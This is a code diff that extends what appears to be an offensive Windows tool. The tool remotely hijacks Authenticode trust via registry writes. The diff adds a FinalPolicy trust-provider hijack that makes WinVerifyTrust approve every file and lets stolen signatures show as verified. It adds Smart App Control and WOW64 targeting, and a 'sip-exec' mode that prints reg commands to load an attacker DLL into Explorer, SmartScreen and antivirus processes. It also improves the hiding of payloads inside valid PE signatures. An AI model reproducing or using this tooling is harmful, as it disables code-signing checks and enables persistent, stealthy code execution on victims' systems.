@@ -6,6 +6,7 @@ import io
 import argparse
 import subprocess
 import os
+import uuid
 
 try:
     from asn1crypto import cms, core
@@ -149,8 +150,32 @@ def write_cert(cert, target, output):
 
 SIPS = {
     "PE": "{C689AAB8-8E78-11D0-8C47-00C04FC295EE}",
+    "Java": "{C689AAB9-8E78-11D0-8C47-00C04FC295EE}",
+    "CAB": "{C689AABA-8E78-11D0-8C47-00C04FC295EE}",
+    "MSI": "{000C10F1-0000-0000-C000-000000000046}",
     "PowerShell": "{603BCC1F-4B59-4E08-B724-D2C6297EF351}",
-    "MSI": "{000C10F1-0000-0000-C000-000000000046}"
+    "JScript": "{06C9E010-38CE-11D4-A2A3-00104BD35090}",
+    "VBScript": "{1629F04E-2799-4DB5-8FE5-ACE10F17EBAB}",
+    "WSF": "{1A610570-38CE-11D4-A2A3-00104BD35090}",
+    "AppX": "{0AC5DF4B-CE07-4DE2-B76E-23C839A09FD1}",
+    "AppXBundle": "{0F5F58B3-AADE-4B9A-A434-95742D92ECEB}",
+    "EAppX": "{CF78C6DE-64A2-4799-B506-89ADFF5D16D6}",
+    "EAppXBundle": "{D1D04F0C-9ABA-430D-B0E4-D7E96ACCE66C}",
+    "P7X": "{5598CFF1-68DB-4340-B57F-1CACF88C9A51}",
+    "CTL": "{9BA61D3F-E73A-11D0-8CD2-00C04FC295EE}",
+    "Flat": "{DE351A42-8E59-11D0-8C47-00C04FC295EE}",
+    "Catalog": "{DE351A43-8E59-11D0-8C47-00C04FC295EE}",
+    "ESD": "{9F3053C5-439D-4BF7-8A77-04F0450A1D9F}",
+}
+
+# Smart App Control SIP (Win11 only, separate from standard SIP hijack)
+SAC_SIP = {
+    "SmartAppControl": "{18B3C141-AE0D-40F9-9465-E542AFC1ABC7}",
+}
+
+# Win11-only AppX extension SIP
+WIN11_SIPS = {
+    "AppXExtensions": "{1AD2DCB4-B636-4E9A-847A-AA8E0E540E93}",
 }
 
 KEYS = []
@@ -167,6 +192,20 @@ CLEAN_CONFIG = {
     "Dll": "C:\\Windows\\System32\\WINTRUST.DLL",
     "FuncName": "CryptSIPVerifyIndirectData"
 }
+
+FINALPOLICY_KEY = "HKLM\\SOFTWARE\\Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy\\{00AAC56B-CD44-11d0-8CC2-00C04FC295EE}"
+
+FINALPOLICY_HIJACK = {
+    "Dll": "C:\\Windows\\System32\\WINTRUST.DLL",
+    "FuncName": "SoftpubCleanup"
+}
+
+FINALPOLICY_CLEAN = {
+    "Dll": "C:\\Windows\\System32\\WINTRUST.DLL",
+    "FuncName": "SoftpubAuthenticode"
+}
+
+FINALPOLICY_BASE_KEY = "HKLM\\SOFTWARE\\Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy"
 
 def find_reg_tool():
     """Find the reg.py tool in the system path."""
@@ -205,6 +244,38 @@ def run_reg_cmd(reg_tool, target, key, value, data):
     except Exception as e:
         print(f"[-] Execution failed: {e}")
         return False
+
+def delete_reg_key(reg_tool, target, key):
+    """Execute reg.py to delete a registry key."""
+    cmd = [
+        reg_tool,
+        target,
+        "delete",
+        "-keyName", key,
+    ]
+
+    print(f"[*] Deleting {key}")
+    try:
+        result = subprocess.run(cmd, capture_output=True, text=True)
+        if result.returncode != 0:
+            if "Access is denied" in result.stderr:
+                print("[-] Access Denied. Check credentials.")
+            else:
+                print(f"[-] Error: {result.stderr.strip()}")
+            return False
+        print("[+] Success")
+        return True
+    except Exception as e:
+        print(f"[-] Execution failed: {e}")
+        return False
+
+def normalize_provider_guid(provider_guid):
+    provider_guid = provider_guid.strip()
+    if not provider_guid.startswith("{"):
+        provider_guid = "{" + provider_guid
+    if not provider_guid.endswith("}"):
+        provider_guid = provider_guid + "}"
+    return provider_guid
 
 # ==========================================
 # PART 3: Metadata Cloning (Linux/Objcopy)
@@ -479,8 +550,13 @@ def _require_asn1crypto():
         print("    Install with: pip install asn1crypto")
         sys.exit(1)
 
-def read_pe_pkcs7(data: bytes):
-    """Extract PKCS#7 blob from PE's WIN_CERTIFICATE. Returns (cert_offset, cert_size, pkcs7_bytes)."""
+def read_pe_pkcs7(data: bytes, signer_index: int = 0):
+    """Extract PKCS#7 blob from PE's WIN_CERTIFICATE entries.
+
+    Returns (cert_dir_offset, cert_rva, total_cert_size, entries, target_index)
+    where entries is a list of (entry_offset, entry_length, pkcs7_bytes) tuples.
+    target_index is the resolved signer_index (handles -1 = last/SHA-256 default).
+    """
     if data[:2] != b'MZ':
         raise ValueError("Not a PE file")
     pe_offset = struct.unpack_from('<I', data, 0x3C)[0]
@@ -497,12 +573,36 @@ def read_pe_pkcs7(data: bytes):
     cert_size = struct.unpack_from('<I', data, cert_dir_offset + 4)[0]
     if cert_rva == 0 or cert_size == 0:
         raise ValueError("PE has no embedded signature")
-    win_cert = data[cert_rva:cert_rva + cert_size]
-    dw_length = struct.unpack_from('<I', win_cert, 0)[0]
-    w_type = struct.unpack_from('<H', win_cert, 6)[0]
-    if w_type != 0x0002:
-        raise ValueError(f"WIN_CERTIFICATE type {w_type:#x} is not PKCS7")
-    return cert_rva, cert_size, win_cert[8:dw_length]
+
+    # Parse all WIN_CERTIFICATE entries (they are 8-byte aligned, concatenated)
+    entries = []
+    pos = cert_rva
+    end = cert_rva + cert_size
+    while pos + 8 <= end:
+        dw_length = struct.unpack_from('<I', data, pos)[0]
+        if dw_length < 8:
+            break
+        w_type = struct.unpack_from('<H', data, pos + 6)[0]
+        if w_type == 0x0002:
+            pkcs7_bytes = data[pos + 8 : pos + dw_length]
+            entries.append((pos, dw_length, pkcs7_bytes))
+        # Advance to next entry (8-byte aligned)
+        aligned = dw_length + ((8 - (dw_length % 8)) % 8)
+        pos += aligned
+
+    if not entries:
+        raise ValueError("No PKCS#7 WIN_CERTIFICATE entries found")
+
+    if signer_index == -1:
+        # Default: last entry (typically SHA-256 in dual-signed PEs)
+        signer_index = len(entries) - 1
+    if signer_index >= len(entries):
+        raise ValueError(f"Signer index {signer_index} out of range (PE has {len(entries)} signature(s))")
+
+    if len(entries) > 1:
+        print(f"[*] Dual-signed PE detected: {len(entries)} WIN_CERTIFICATE entries, targeting index {signer_index}")
+
+    return cert_dir_offset, cert_rva, cert_size, entries, signer_index
 
 def _der_length(length: int) -> bytes:
     if length < 0x80:
@@ -611,18 +711,25 @@ def pkcs7_extract_camouflage(signed_data) -> bytes | None:
                 return _unwrap_nested_sig(values[0].dump())
     return None
 
-def rebuild_pe_cert(original_data: bytes, cert_offset: int, new_pkcs7: bytes) -> bytes:
-    """Rebuild PE with new PKCS7 signature blob."""
-    pe_offset = struct.unpack_from('<I', original_data, 0x3C)[0]
-    magic = struct.unpack_from('<H', original_data, pe_offset + 0x18)[0]
-    cert_dir_offset = pe_offset + 0x18 + (0x90 if magic == 0x20b else 0x80)
-    dw_length = 8 + len(new_pkcs7)
-    padding = (8 - (dw_length % 8)) % 8
-    win_cert = struct.pack('<IHH', dw_length, 0x0200, 0x0002) + new_pkcs7 + b'\x00' * padding
-    result = bytearray(original_data[:cert_offset])
-    result.extend(win_cert)
-    struct.pack_into('<I', result, cert_dir_offset, cert_offset)
-    struct.pack_into('<I', result, cert_dir_offset + 4, len(win_cert))
+def rebuild_pe_cert(original_data: bytes, cert_dir_offset: int, cert_rva: int,
+                    entries: list, target_index: int, new_pkcs7: bytes) -> bytes:
+    """Rebuild PE with modified PKCS7 in one entry, preserving other entries."""
+    result = bytearray(original_data[:cert_rva])
+
+    for i, (entry_off, entry_len, _pkcs7) in enumerate(entries):
+        if i == target_index:
+            dw_length = 8 + len(new_pkcs7)
+            padding = (8 - (dw_length % 8)) % 8
+            wc = struct.pack('<IHH', dw_length, 0x0200, 0x0002) + new_pkcs7 + b'\x00' * padding
+        else:
+            # Preserve original entry with its 8-byte alignment
+            aligned = entry_len + ((8 - (entry_len % 8)) % 8)
+            wc = original_data[entry_off : entry_off + aligned]
+        result.extend(wc)
+
+    total_cert_size = len(result) - cert_rva
+    struct.pack_into('<I', result, cert_dir_offset, cert_rva)
+    struct.pack_into('<I', result, cert_dir_offset + 4, total_cert_size)
     return bytes(result)
 
 # ==========================================
@@ -645,8 +752,12 @@ def main():
     hijack_parser.add_argument("target_ip", help="Target IP/Hostname (e.g., 192.168.1.10)")
     hijack_parser.add_argument("-u", "--user", required=True, help="Username (DOMAIN/User or User)")
     hijack_parser.add_argument("-p", "--password", required=True, help="Password")
-    hijack_parser.add_argument("--action", choices=["hijack", "clean"], default="hijack", help="Action to perform")
+    hijack_parser.add_argument("--action", choices=["hijack", "clean", "finalpolicy", "finalpolicy-clean", "custom-provider", "custom-provider-clean"], default="hijack", help="Action to perform")
+    hijack_parser.add_argument("--provider-guid", help="Provider GUID for custom-provider/custom-provider-clean (default: random GUID for custom-provider)")
     hijack_parser.add_argument("--tool", help="Path to reg.py if not in PATH")
+    hijack_parser.add_argument("--wow64-only", action="store_true", help="Write only to WOW6432Node (hijacks 32-bit callers, 64-bit registry stays clean)")
+    hijack_parser.add_argument("--sac", action="store_true", help="Include Smart App Control SIP (Win11 only, GUID 18B3C141)")
+    hijack_parser.add_argument("--all-sips", action="store_true", help="Include all 19 SIP GUIDs (standard + SAC + Win11-only)")
 
     # Subcommand: embed
     embed_parser = subparsers.add_parser("embed", help="Embed payload in PKCS#7 unauthenticated attributes (signature stays valid)")
@@ -655,6 +766,7 @@ def main():
     embed_parser.add_argument("-o", "--output", required=True, help="Output PE path")
     embed_parser.add_argument("--oid", default=PKCS7_DEFAULT_OID, help=f"Custom OID (default: {PKCS7_DEFAULT_OID})")
     embed_parser.add_argument("--camouflage", action="store_true", help="Wrap payload as a fake SPC_NESTED_SIGNATURE (blends with dual-signed PEs)")
+    embed_parser.add_argument("--signer-index", type=int, default=-1, help="WIN_CERTIFICATE entry index to embed into (-1 = last/SHA-256, 0 = first)")
 
     # Subcommand: extract
     extract_parser = subparsers.add_parser("extract", help="Extract embedded payload from PKCS#7 unauthenticated attributes")
@@ -662,6 +774,14 @@ def main():
     extract_parser.add_argument("-o", "--output", required=True, help="Output payload file")
     extract_parser.add_argument("--oid", default=PKCS7_DEFAULT_OID, help=f"OID to extract (default: {PKCS7_DEFAULT_OID})")
     extract_parser.add_argument("--camouflage", action="store_true", help="Extract from SPC_NESTED_SIGNATURE camouflage wrapper")
+    extract_parser.add_argument("--signer-index", type=int, default=-1, help="WIN_CERTIFICATE entry index to extract from (-1 = last, 0 = first)")
+
+    # Subcommand: sip-exec
+    sipexec_parser = subparsers.add_parser("sip-exec", help="Register a DLL as CryptSIPDllIsMyFileType2 handler (code exec on WinVerifyTrust calls)")
+    sipexec_parser.add_argument("--dll", required=True, help="Full path to DLL on target (e.g. C:\\Temp\\payload.dll)")
+    sipexec_parser.add_argument("--funcname", default="IsMyFileType2", help="Export function name (default: IsMyFileType2)")
+    sipexec_parser.add_argument("--guid", help="SIP GUID to register (default: random)")
+    sipexec_parser.add_argument("--clean", action="store_true", help="Remove the registered SIP GUID")
 
     args = parser.parse_args()
 
@@ -710,24 +830,89 @@ def main():
             
         print(f"[*] Using registry tool: {reg_tool}")
         
-        config = HIJACK_CONFIG if args.action == "hijack" else CLEAN_CONFIG
-        success_count = 0
-        total_ops = len(KEYS) * 2
-        
         print(f"[*] Starting {args.action.upper()} operation on {args.target_ip}...")
-        
-        for key in KEYS:
-            for val_name, val_data in config.items():
-                if run_reg_cmd(reg_tool, target_str, key, val_name, val_data):
+
+        if args.action == "finalpolicy":
+            success_count = 0
+            total_ops = len(FINALPOLICY_HIJACK)
+            for val_name, val_data in FINALPOLICY_HIJACK.items():
+                if run_reg_cmd(reg_tool, target_str, FINALPOLICY_KEY, val_name, val_data):
                     success_count += 1
-        
-        print("-" * 50)
-        if success_count == total_ops:
-            print(f"[+] Operation completed successfully ({success_count}/{total_ops} changes).")
-            if args.action == "hijack":
-                print("[!] Target is now hijacked. Reboot or re-login may be required.")
+            print("-" * 50)
+            if success_count == total_ops:
+                print("[+] FinalPolicy hijacked. WinVerifyTrust now returns success for all files.")
+                print("[!] Stolen signatures will show verified publisher (Subject CN from cert).")
+                print("[!] This is system-wide. Affects all processes. Survives reboot.")
+            else:
+                print(f"[-] Operation completed with errors ({success_count}/{total_ops} changes successful).")
+        elif args.action == "finalpolicy-clean":
+            success_count = 0
+            total_ops = len(FINALPOLICY_CLEAN)
+            for val_name, val_data in FINALPOLICY_CLEAN.items():
+                if run_reg_cmd(reg_tool, target_str, FINALPOLICY_KEY, val_name, val_data):
+                    success_count += 1
+            print("-" * 50)
+            if success_count == total_ops:
+                print("[+] FinalPolicy restored to SoftpubAuthenticode (default).")
+            else:
+                print(f"[-] Operation completed with errors ({success_count}/{total_ops} changes successful).")
+        elif args.action == "custom-provider":
+            provider_guid = normalize_provider_guid(args.provider_guid) if args.provider_guid else "{" + str(uuid.uuid4()) + "}"
+            provider_key = f"{FINALPOLICY_BASE_KEY}\\{provider_guid}"
+            success_count = 0
+            total_ops = len(FINALPOLICY_HIJACK)
+            for val_name, val_data in FINALPOLICY_HIJACK.items():
+                if run_reg_cmd(reg_tool, target_str, provider_key, val_name, val_data):
+                    success_count += 1
+            print("-" * 50)
+            if success_count == total_ops:
+                print(f"[+] Custom trust provider registered: {provider_guid}")
+                print(f"[!] WinVerifyTrust callers must use this GUID: {provider_guid}")
+            else:
+                print(f"[-] Operation completed with errors ({success_count}/{total_ops} changes successful).")
+        elif args.action == "custom-provider-clean":
+            if not args.provider_guid:
+                hijack_parser.error("--provider-guid is required for custom-provider-clean")
+            provider_guid = normalize_provider_guid(args.provider_guid)
+            provider_key = f"{FINALPOLICY_BASE_KEY}\\{provider_guid}"
+            print("-" * 50)
+            if delete_reg_key(reg_tool, target_str, provider_key):
+                print(f"[+] Custom trust provider removed: {provider_guid}")
+            else:
+                print(f"[-] Failed to remove custom trust provider: {provider_guid}")
         else:
-            print(f"[-] Operation completed with errors ({success_count}/{total_ops} changes successful).")
+            config = HIJACK_CONFIG if args.action == "hijack" else CLEAN_CONFIG
+            # Build SIP set based on flags
+            active_sips = dict(SIPS)
+            if getattr(args, 'sac', False) or getattr(args, 'all_sips', False):
+                active_sips.update(SAC_SIP)
+                print("[!] Smart App Control SIP included (Win11 only).")
+            if getattr(args, 'all_sips', False):
+                active_sips.update(WIN11_SIPS)
+                print(f"[*] All {len(active_sips)} SIP GUIDs targeted.")
+            # Build key list based on --wow64-only
+            keys = []
+            for name, guid in active_sips.items():
+                if not getattr(args, 'wow64_only', False):
+                    keys.append(f"HKLM\\SOFTWARE\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\{guid}")
+                keys.append(f"HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\{guid}")
+            if getattr(args, 'wow64_only', False):
+                print("[!] WOW64-only mode: writing to WOW6432Node only. Affects 32-bit callers. 64-bit registry untouched.")
+            success_count = 0
+            total_ops = len(keys) * 2
+
+            for key in keys:
+                for val_name, val_data in config.items():
+                    if run_reg_cmd(reg_tool, target_str, key, val_name, val_data):
+                        success_count += 1
+
+            print("-" * 50)
+            if success_count == total_ops:
+                print(f"[+] Operation completed successfully ({success_count}/{total_ops} changes).")
+                if args.action == "hijack":
+                    print("[!] Target is now hijacked. Reboot or re-login may be required.")
+            else:
+                print(f"[-] Operation completed with errors ({success_count}/{total_ops} changes successful).")
 
     elif args.command == "embed":
         _require_asn1crypto()
@@ -736,10 +921,11 @@ def main():
         with open(args.payload, 'rb') as f:
             payload = f.read()
         try:
-            cert_offset, cert_size, pkcs7 = read_pe_pkcs7(pe_data)
+            cert_dir_offset, cert_rva, cert_size, entries, idx = read_pe_pkcs7(pe_data, args.signer_index)
         except ValueError as e:
             print(f"[-] {e}")
             sys.exit(1)
+        pkcs7 = entries[idx][2]
         ci = cms.ContentInfo.load(pkcs7)
         sd = ci['content']
         if args.camouflage:
@@ -751,7 +937,7 @@ def main():
             used_oid = args.oid
             mode_label = "direct"
         new_ci = cms.ContentInfo({'content_type': 'signed_data', 'content': sd})
-        output = rebuild_pe_cert(pe_data, cert_offset, new_ci.dump())
+        output = rebuild_pe_cert(pe_data, cert_dir_offset, cert_rva, entries, idx, new_ci.dump())
         with open(args.output, 'wb') as f:
             f.write(output)
         print(f"[+] Embedded {len(payload):,} bytes [{mode_label}] (OID: {used_oid}) into {args.output}")
@@ -762,10 +948,11 @@ def main():
         with open(args.source, 'rb') as f:
             pe_data = f.read()
         try:
-            _, _, pkcs7 = read_pe_pkcs7(pe_data)
+            _, _, _, entries, idx = read_pe_pkcs7(pe_data, args.signer_index)
         except ValueError as e:
             print(f"[-] {e}")
             sys.exit(1)
+        pkcs7 = entries[idx][2]
         ci = cms.ContentInfo.load(pkcs7)
         if args.camouflage:
             payload = pkcs7_extract_camouflage(ci['content'])
@@ -779,6 +966,36 @@ def main():
         with open(args.output, 'wb') as f:
             f.write(payload)
         print(f"[+] Extracted {len(payload):,} bytes from {label} to {args.output}")
+
+    elif args.command == "sip-exec":
+        import uuid as _uuid
+        guid = args.guid or "{" + str(_uuid.uuid4()).upper() + "}"
+        if not guid.startswith("{"):
+            guid = "{" + guid + "}"
+
+        base = "HKLM\\SOFTWARE\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllIsMyFileType2"
+        key = f"{base}\\{guid}"
+
+        if args.clean:
+            print(f"[*] Removing SIP exec registration: {guid}")
+            print(f"[*] Registry key: {key}")
+            print("[!] Manual removal required (use reg.exe delete or regedit).")
+            print(f'    reg delete "{key}" /f')
+        else:
+            print(f"[+] SIP Exec Registration")
+            print(f"    GUID:     {guid}")
+            print(f"    DLL:      {args.dll}")
+            print(f"    Function: {args.funcname}")
+            print(f"    Key:      {key}")
+            print()
+            print("[*] Registry commands to run on target (requires admin):")
+            print(f'    reg add "{key}" /v Dll /t REG_SZ /d "{args.dll}" /f')
+            print(f'    reg add "{key}" /v FuncName /t REG_SZ /d "{args.funcname}" /f')
+            print()
+            print("[!] Once registered, your DLL loads in ANY process that calls WinVerifyTrust.")
+            print("[!] This includes Explorer, SmartScreen, AV scanners, and certutil.")
+            print("[!] The DLL function is called during SIP file-type resolution for every file.")
+            print(f"[*] To remove: reg delete \"{key}\" /f")
 
     else:
         parser.print_help()
